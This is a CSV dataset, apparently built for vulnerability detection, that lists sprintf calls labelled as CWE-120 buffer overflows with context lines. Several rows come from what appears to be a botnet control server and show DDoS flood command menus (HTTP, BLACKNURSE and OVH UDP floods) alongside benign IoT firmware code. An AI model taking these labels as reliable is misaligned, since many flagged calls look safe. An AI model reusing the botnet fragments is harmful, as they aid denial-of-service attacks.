GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");",120,1,"				sprintf(ddosline8, ""\e[37m  ║  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    ║\r\n"");
				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
				sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");",120,1,"				sprintf(ddosline9, ""\e[37m  ║  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  ║\r\n"");
				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
				sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");

"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");",120,1,"				sprintf(ddosline10, ""\e[37m  ║  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 ║\r\n"");
				sprintf(ddosline11, ""\e[37m  ║  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  ║\r\n"");
				sprintf(ddosline12, ""\e[37m  ╚════════════════════════════════════════════════════════════════════════════════════╝\r\n"");

				if(send(datafd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[32mMute Disabled!\x1b[37m\r\n"");",120,1,"                {
                    managements[datafd].mute = 0;
                    sprintf(botnet, ""\x1b[32mMute Disabled!\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[31mError, Mute is Already Disabled.\x1b[37m\r\n"");",120,1,"                else
                {
                    sprintf(botnet, ""\x1b[31mError, Mute is Already Disabled.\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[32mMute Enabled!\x1b[37m\r\n"");",120,1,"                {
                    managements[datafd].mute = 1;
                    sprintf(botnet, ""\x1b[32mMute Enabled!\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[31mError, Mute is Already Enabled.\x1b[37m\r\n"");",120,1,"                else
                {
                    sprintf(botnet, ""\x1b[31mError, Mute is Already Enabled.\x1b[37m\r\n"");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(killattack, ""Succesfully Stopped Attack!\r\n"");",120,1,"				char killattack [2048];
				memset(killattack, 0, 2048);
				sprintf(killattack, ""Succesfully Stopped Attack!\r\n"");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
			}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(auresp, ""\x1b[39mEnter new unsername\x1b[35m: \x1b[37m"");",120,1,"					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
					sprintf(auresp, ""\x1b[39mEnter new unsername\x1b[35m: \x1b[37m"");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(auresp, ""\x1b[39mEnter new password\x1b[35m: \x1b[37m"");",120,1,"					}
					memset(auresp, 0, sizeof(auresp));
					sprintf(auresp, ""\x1b[39mEnter new password\x1b[35m: \x1b[37m"");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(clearscreen, ""\033[2J\033[1;1H"");",120,1,"				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, ""\033[2J\033[1;1H"");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
            }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(logoutmessage, ""Redirecting..., %s"", accounts[find_line].username);",120,1,"				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, ""Redirecting..., %s"", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(5);
"
2021\esp-discord\src\discord_ota.c,Dataset Download,../../Dataset Download/2021\esp-discord\src\discord_ota.c,"sprintf(sha256 + (i * 2), ""%02x"", hash[i]);",120,1,"
    for (int i = 0; i < hash_len; i++) {
        sprintf(sha256 + (i * 2), ""%02x"", hash[i]);
    }

"
2021\esp-discord\src\discord_ota.c,Dataset Download,../../Dataset Download/2021\esp-discord\src\discord_ota.c,"sprintf(uptime, ""%lld ms"", esp_timer_get_time() / 1000);",120,1,"
    char uptime[25];
    sprintf(uptime, ""%lld ms"", esp_timer_get_time() / 1000);

    char free_heap[15];
"
2021\esp-discord\src\discord_ota.c,Dataset Download,../../Dataset Download/2021\esp-discord\src\discord_ota.c,"sprintf(free_heap, ""%d bytes"", esp_get_free_heap_size());",120,1,"
    char free_heap[15];
    sprintf(free_heap, ""%d bytes"", esp_get_free_heap_size());

    char* content = estr_cat(
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringMac, ""%02X:%02X:%02X:%02X:%02X:%02X"",",120,1,"       Our MAC format contains 2 * 6 = 12 characters for the 6 two digit hex values and 5 colons between them.
       Therefore we need: 12 (MACs) + 5 (colons) + 1 (0 at end) = 18 characters for buffer size. */
    sprintf( stringMac, ""%02X:%02X:%02X:%02X:%02X:%02X"",
             mac.mac[0], mac.mac[1], mac.mac[2],
             mac.mac[3], mac.mac[4], mac.mac[5] );   // Formatting the data into the standard ""MAC style"".
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringTimestamp, ""%lu"", timestamp );",120,1,"void timestampTostring( char* stringTimestamp, unsigned long timestamp )
{
    sprintf( stringTimestamp, ""%lu"", timestamp );

} // timestampTostring
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringPacketCounter, ""%u"", packetCounter );",120,1,"void packetCounterTostring( char* stringPacketCounter, unsigned int& packetCounter )
{
    sprintf( stringPacketCounter, ""%u"", packetCounter );

} // packetCounterTostring
"
2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,Dataset Download,../../Dataset Download/2021\ESP32WiFiSnifferApp\ESP32WiFiSnifferApp\src\generalFunctions.cpp,"sprintf( stringRSSI, ""%d"", RSSI );",120,1,"void RSSITostring( char* stringRSSI, int8_t& RSSI )
{
    sprintf( stringRSSI, ""%d"", RSSI ); 

} // RSSITostring
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%d"", value);",120,1,"    inline Trace &operator<<(int value)
    {
        sprintf(buff, ""%d"", value);
        __debugPrinter(buff);
        return *this;
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%ld"", value);",120,1,"    inline Trace &operator<<(long int value)
    {
        sprintf(buff, ""%ld"", value);
        __debugPrinter(buff);
        return *this;
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%lu"", value);",120,1,"    inline Trace &operator<<(unsigned long value)
    {
        sprintf(buff, ""%lu"", value);
        __debugPrinter(buff);
        return *this;
"
2021\fusor-state-machine\src\StateMachineDebug.h,Dataset Download,../../Dataset Download/2021\fusor-state-machine\src\StateMachineDebug.h,"sprintf(buff, ""%ld.%04ld"", fixed / 10000L, fixed % 10000L);",120,1,"
        long int fixed = (long int)(value * 10000.0 + 0.5);
        sprintf(buff, ""%ld.%04ld"", fixed / 10000L, fixed % 10000L);
        __debugPrinter(buff);
        return *this;
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_payload_buffer, ""%.2f"", payload);",120,1,"void mqtt_publish(const char* topic, float payload)
{
    sprintf(mqtt_payload_buffer, ""%.2f"", payload);
	mqtt_publish_buffer(topic, mqtt_payload_buffer);
}
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_payload_buffer, ""%d"", payload);",120,1,"void mqtt_publish(const char* topic, unsigned int payload)
{
    sprintf(mqtt_payload_buffer, ""%d"", payload);
	mqtt_publish_buffer(topic, mqtt_payload_buffer);
}
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_HUM, i);",120,1,"    for(int i=0; i<NUM_DHTS; i++)
    {
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_HUM, i);
        mqtt_publish(mqtt_topic_buffer, data->hum[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);",120,1,"        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_HUM, i);
        mqtt_publish(mqtt_topic_buffer, data->hum[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);
        mqtt_publish(mqtt_topic_buffer, data->temp[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_IDX, i);
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_IDX, i);",120,1,"        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_TEMP, i);
        mqtt_publish(mqtt_topic_buffer, data->temp[i]);
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_IDX, i);
        mqtt_publish(mqtt_topic_buffer, data->hic[i]);
    }
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_SOIL, i);",120,1,"    for(int i=0; i<NUM_SOILS; i++)
    {
        sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_SOIL, i);
        mqtt_publish(mqtt_topic_buffer, data->moist[i]);
    }
"
2021\greenhouse-firmware\src\main.cpp,Dataset Download,../../Dataset Download/2021\greenhouse-firmware\src\main.cpp,"sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_PUMP, i);",120,1,"            for(int i=0; i<NUM_PUMPS; i++)
            {
                sprintf(mqtt_topic_buffer, ""%s/%d"", MQTT_PUB_PUMP, i);
                bool res = mqtt_client.subscribe(mqtt_topic_buffer, 1);
                Serial.printf(""Subscribed to: %s, ok: %d\n"", mqtt_topic_buffer, res?1:0);
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"sprintf(port_str, ""%u"", port);",120,1,"    memset(pTlsData, 0x0, sizeof(TLSDataParams_t));

    sprintf(port_str, ""%u"", port);

    if (0 != _TLSConnectNetwork(pTlsData, host, port_str, ca_crt, ca_crt_len,
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_tcp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_tcp.c,"sprintf(service, ""%u"", port);",120,1,"    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    sprintf(service, ""%u"", port);

    if ((rc = getaddrinfo(host, service, &hints, &addrInfoList)) != 0) {
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,"sprintf(port_ptr, ""%u"", port);",120,1,"    }

    sprintf(port_ptr, ""%u"", port);
    memset((char *)&hints, 0x00, sizeof(hints));
    hints.ai_socktype = SOCK_DGRAM;
"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"sprintf(elem, ""%09u"", (unsigned int)tx);",120,1,"
    if (len > 9) {
        sprintf(elem, ""%09u"", (unsigned int)tx);
    } else {
        sprintf(elem, ""%u"", (unsigned int)tx);
"
2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\impl_ntp.c,"sprintf(elem, ""%u"", (unsigned int)tx);",120,1,"        sprintf(elem, ""%09u"", (unsigned int)tx);
    } else {
        sprintf(elem, ""%u"", (unsigned int)tx);
    }

"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""null"");",120,1,"    /* This checks for NaN and Infinity */
    if ((d * 0) != 0) {
        length = sprintf((char *)number_buffer, ""null"");
    } else {
        /* Try float data type */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""%f"", d);",120,1,"    } else {
        /* Try float data type */
        length = sprintf((char *)number_buffer, ""%f"", d);

        if ((sscanf((char *)number_buffer, ""%f"", &test_float) != 1) || ((double)test_float != d)) {
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""%1.15g"", d);",120,1,"        if ((sscanf((char *)number_buffer, ""%f"", &test_float) != 1) || ((double)test_float != d)) {
            /* Try 15 decimal places of precision to avoid nonsignificant nonzero digits */
            length = sprintf((char *)number_buffer, ""%1.15g"", d);

            /* Check whether the original double can be recovered */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"length = sprintf((char *)number_buffer, ""%1.17g"", d);",120,1,"            if ((sscanf((char *)number_buffer, ""%lg"", &test) != 1) || ((double)test != d)) {
                /* If not, print with 17 decimal places of precision */
                length = sprintf((char *)number_buffer, ""%1.17g"", d);
            }
        } else {
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"sprintf((char *)output_pointer, ""u%04x"", *input_pointer);",120,1,"                default:
                    /* escape and print as unicode codepoint */
                    sprintf((char *)output_pointer, ""u%04x"", *input_pointer);
                    output_pointer += 4;
                    break;
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"sprintf(rsp_buf, HTTP_HEADER, host_file, host_addr, port);",120,1,"
    memset(rsp_buf, 0, HTTP_BUFF_SIZE);
    sprintf(rsp_buf, HTTP_HEADER, host_file, host_addr, port);

    send      = 0;
"
2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\addons\network\http\module_http.c,"sprintf(http_buf, ""%s"", ""ERROR"");",120,1,"    {
        memset(http_buf, 0, HTTP_BUFF_SIZE);
        sprintf(http_buf, ""%s"", ""ERROR"");
    }

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK_INTERNAL_DECL void duk_fb_sprintf(duk_fixedbuffer *fb, const char *fmt, ...);",120,1,"DUK_INTERNAL_DECL void duk_fb_put_byte(duk_fixedbuffer *fb, duk_uint8_t x);
DUK_INTERNAL_DECL void duk_fb_put_cstring(duk_fixedbuffer *fb, const char *x);
DUK_INTERNAL_DECL void duk_fb_sprintf(duk_fixedbuffer *fb, const char *fmt, ...);
DUK_INTERNAL_DECL void duk_fb_put_funcptr(duk_fixedbuffer *fb, duk_uint8_t *fptr, duk_size_t fptr_size);
DUK_INTERNAL_DECL duk_bool_t duk_fb_is_full(duk_fixedbuffer *fb);
"
